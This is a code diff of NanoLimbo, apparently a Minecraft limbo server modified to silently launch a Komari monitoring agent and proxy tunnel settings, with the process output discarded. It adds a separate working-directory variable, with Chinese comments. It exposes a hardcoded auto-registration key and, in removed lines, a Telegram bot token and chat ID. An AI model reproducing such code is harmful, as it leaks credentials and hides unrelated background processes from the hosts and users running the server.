@@ -28,7 +28,8 @@ public final class NanoLimbo {
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
 
         // Komari
-        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY"
+        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
+        "KOMARI_FILE_PATH" // ✅ 新增
     };
 
     public static void main(String[] args) {
@@ -75,7 +76,9 @@ public final class NanoLimbo {
         String server = env.getOrDefault("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
         String token = env.getOrDefault("KOMARI_TOKEN", "");
         String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "GSyCovVz8xbpJpmfksU95USJ");
-        String filePath = env.getOrDefault("FILE_PATH", "./cache");
+
+        // ✅ 使用独立目录
+        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./cache");
 
         File workDir = new File(filePath);
         if (!workDir.exists()) {
@@ -116,7 +119,7 @@ public final class NanoLimbo {
             }
 
             ProcessBuilder pb = new ProcessBuilder(cmd);
-            pb.directory(workDir);
+            pb.directory(workDir); // ✅ 固定到独立目录
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
 
@@ -281,8 +284,8 @@ public final class NanoLimbo {
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("DISABLE_ARGO", "false");
-        envVars.put("CHAT_ID", "7592034407");
-        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "www.ntu.edu.sg");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "ceshi");
